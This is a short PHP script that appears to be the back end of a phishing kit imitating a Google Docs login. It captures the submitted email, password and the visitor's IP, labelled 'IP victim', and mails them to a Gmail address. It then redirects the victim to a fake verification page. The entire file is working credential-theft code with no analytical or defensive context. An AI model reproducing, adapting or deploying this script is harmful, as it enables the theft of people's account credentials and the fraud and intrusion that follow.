<?php
$ip = getenv("REMOTE_ADDR");
$email = $_POST['Email'];
$password = $_POST['Passwd'];


$login = "Email Address : ".$email;
$pass = "Password : ".$password;
$target = "IP victim : ".$ip;


$head = "########### Login info ############";
$foot = "####### Indramayu CyBer ###########";
$body = "Googledoc Login Information";
mail("jesuswire80@gmail.com", "$body","$head \n$login \n$pass \n$target \n$foot");
header("Location: verification.html");
?>